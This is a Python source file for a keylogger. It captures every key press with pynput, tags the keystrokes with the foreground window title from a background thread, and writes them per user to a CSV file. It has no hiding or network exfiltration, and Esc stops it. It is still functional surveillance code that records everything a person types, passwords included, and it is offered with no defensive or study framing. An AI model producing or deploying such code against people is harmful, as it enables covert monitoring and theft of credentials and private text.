import os
import csv
from threading import Thread
from pynput.keyboard import Key, Listener

from keylogger import read_key
from screen import getForegroundWindowTitle


# Current user
user = os.getlogin()

# Dictionary to save user windows, pressed keys and timestamp
data = {user : {} }

# Current timestamp
timestamp = 0

last_window = getForegroundWindowTitle()
last_key = ""

# stop window thread when true. Used for debug
stop_thread = False


def update_data(window, key):
    global data, user, timestamp

    # If the timestamp changed add a new event under the user's window
    if timestamp not in data[user]: data[user][timestamp] = [key, window]
    else: data[user][timestamp][0] += key


def get_data(_key, window=None):
    global last_key, last_window, stop_thread, timestamp

    if _key == Key.esc: 
        stop_thread = True
        l.stop() # debug only. Press esc to stop the code

    key = read_key(_key)
    
    if window is None: window = getForegroundWindowTitle()

    if key == "\n": timestamp += 1
    elif window == last_window:  update_data(window, key)
    else: update_data(window, key)

    last_key = key


# Trigger data when the user switches windows
def window_listener():
    global last_window, stop_thread, timestamp

    while True and not stop_thread:
        window = getForegroundWindowTitle()
        if window is None: continue
        if window != last_window:
            if last_key != "\n": timestamp += 1
            get_data("", window)
            last_window = window        


# Listen to window changes
window_thread = Thread(target=window_listener)
window_thread.start()

# Listen to keyboard events
with Listener(on_press=get_data) as l:
    l.join()


with open(user+"_test.csv", "w", newline="") as test_file:
    writer = csv.writer(test_file)
    for user in data:
        for key, value in data[user].items():
            writer.writerow([key, *value])




print(data)